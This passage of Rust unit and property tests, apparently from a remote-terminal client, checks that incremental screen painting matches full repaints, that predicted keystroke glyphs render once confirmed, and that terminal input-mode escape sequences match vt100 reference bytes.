        /// every frame whole shows: on a terminal the screen's size and on a larger one.
        #[test]
        fn painting_what_changed_shows_what_painting_everything_shows(
            steps in proptest::collection::vec(
                (
                    proptest::collection::vec(0..PIECES.len(), 0..6),
                    proptest::option::of(0..STATUSES.len()),
                    proptest::option::of((0u16..6, 0u16..20, 0..GLYPHS.len())),
                ),
                1..12,
            ),
            larger in proptest::prelude::any::<bool>(),
        ) {
            let (rows, cols) = (6, 20);
            let size = if larger { Size::new(8, 30) } else { Size::new(rows, cols) };
            let mut emu = crate::terminal::ServerTerminal::new(rows, cols, 0).unwrap();
            let mut painter = Painter::default();
            let mut incremental = fux_vt::Parser::new(size.rows, size.cols, 0).unwrap();
            let mut whole = fux_vt::Parser::new(size.rows, size.cols, 0).unwrap();
            for (pieces, status, prediction) in steps {
                for piece in pieces {
                    emu.process(PIECES[piece].as_bytes());
                }
                let screen = emu.snapshot();
                let overlay = Overlay::of(
                    prediction.map(|(row, col, glyph)| {
                        ((row, col), PredictedCell {
                            glyph: GLYPHS[glyph],
                            fg: Color::Idx(2),
                            bg: Color::Default,
                        })
                    }),
                    None,
                );
                let status = status.map(|status| STATUSES[status]);
                let mut changed = CaptureBackend { size, ..CaptureBackend::default() };
                painter.render(&mut changed, screen.screen(), &overlay, status).unwrap();
                let mut everything = CaptureBackend { size, ..CaptureBackend::default() };
                Painter::default()
                    .render(&mut everything, screen.screen(), &overlay, status)
                    .unwrap();
                incremental.process(&changed.bytes).unwrap();
                whole.process(&everything.bytes).unwrap();
                proptest::prop_assert_eq!(shown(&incremental), shown(&whole));
            }
        }
    }

    #[test]
    fn renders_prediction_overlay_glyph() {
        // A predicted glyph (once the server has confirmed it echoes) must appear in the output.
        // Predictions are epoch-gated and hidden until confirmed, so confirm a first keystroke,
        // then a subsequent typed char becomes visible and should render.
        let mut pe = PredictionEngine::new(DisplayPreference::Always);
        pe.set_local_frame_sent(0);
        let blank = screen_of(b"");
        pe.new_user_byte(b'a', &blank); // hidden (epoch 1, unconfirmed)
        let echoed = screen_of(b"a");
        pe.set_local_frame_late_acked(1);
        pe.cull(&echoed); // confirms -> confirmed_epoch = 1

        pe.set_local_frame_sent(1);
        pe.new_user_byte(b'Z', &echoed); // now visible at (0,1)
        let overlay = pe.overlay();
        assert!(
            !overlay.is_empty(),
            "confirmed prediction should be visible"
        );

        let s = render_to_string(&echoed, &overlay, None);
        assert!(s.contains('Z'), "predicted glyph not rendered");
        assert!(!s.contains("\x1b[4m"), "predictions are not underlined");
    }

    // --- InputModes emits vt100 0.16's input-mode bytes ---

    #[test]
    fn input_modes_formatted_and_diff_match_the_vt100_oracle() {
        // Reference bytes from vt100 0.16.2's `input_mode_formatted` / `input_mode_diff`: the local
        // terminal must see exactly these.
        let seqs: [&[u8]; 6] = [
            b"",
            b"\x1b[?2004h",
            b"\x1b[?1000h\x1b[?1006h",
            b"\x1b[?1003h\x1b[?1005h\x1b[?1h\x1b=",
            b"\x1b[?1002h\x1b[?2004h",
            b"\x1b[?9h",
        ];
        let formatted: [&str; 6] = [
            "\x1b>\x1b[?1l\x1b[?2004l",
            "\x1b>\x1b[?1l\x1b[?2004h",
            "\x1b>\x1b[?1l\x1b[?2004l\x1b[?1000h\x1b[?1006h",
            "\x1b=\x1b[?1h\x1b[?2004l\x1b[?1003h\x1b[?1005h",
            "\x1b>\x1b[?1l\x1b[?2004h\x1b[?1002h",
            "\x1b>\x1b[?1l\x1b[?2004l\x1b[?9h",
        ];
        let diff: [[&str; 6]; 6] = [
            [
                "",
                "\x1b[?2004l",
                "\x1b[?1000l\x1b[?1006l",
                "\x1b>\x1b[?1l\x1b[?1003l\x1b[?1005l",
                "\x1b[?2004l\x1b[?1002l",
                "\x1b[?9l",
            ],
            [
                "\x1b[?2004h",
                "",
                "\x1b[?2004h\x1b[?1000l\x1b[?1006l",
                "\x1b>\x1b[?1l\x1b[?2004h\x1b[?1003l\x1b[?1005l",
                "\x1b[?1002l",
                "\x1b[?2004h\x1b[?9l",
            ],
            [
                "\x1b[?1000h\x1b[?1006h",
                "\x1b[?2004l\x1b[?1000h\x1b[?1006h",
                "",
                "\x1b>\x1b[?1l\x1b[?1000h\x1b[?1006h",
                "\x1b[?2004l\x1b[?1000h\x1b[?1006h",
                "\x1b[?1000h\x1b[?1006h",
            ],
            [
                "\x1b=\x1b[?1h\x1b[?1003h\x1b[?1005h",
                "\x1b=\x1b[?1h\x1b[?2004l\x1b[?1003h\x1b[?1005h",
                "\x1b=\x1b[?1h\x1b[?1003h\x1b[?1005h",
                "",
                "\x1b=\x1b[?1h\x1b[?2004l\x1b[?1003h\x1b[?1005h",
                "\x1b=\x1b[?1h\x1b[?1003h\x1b[?1005h",
            ],
            [
                "\x1b[?2004h\x1b[?1002h",
                "\x1b[?1002h",
                "\x1b[?2004h\x1b[?1002h\x1b[?1006l",
                "\x1b>\x1b[?1l\x1b[?2004h\x1b[?1002h\x1b[?1005l",
                "",
                "\x1b[?2004h\x1b[?1002h",
            ],
            [
                "\x1b[?9h",
                "\x1b[?2004l\x1b[?9h",
                "\x1b[?9h\x1b[?1006l",
                "\x1b>\x1b[?1l\x1b[?9h\x1b[?1005l",
                "\x1b[?2004l\x1b[?9h",
                "",
            ],
        ];
        let modes: Vec<InputModes> = seqs
            .iter()
            .map(|s| InputModes::from(&screen_of(s)))
            .collect();
        for (i, cur) in modes.iter().enumerate() {
            assert_eq!(cur.formatted(), formatted[i].as_bytes(), "formatted {i}");
            for (j, prev) in modes.iter().enumerate() {
                assert_eq!(cur.diff(*prev), diff[i][j].as_bytes(), "diff {i} from {j}");
            }
        }
    }
}
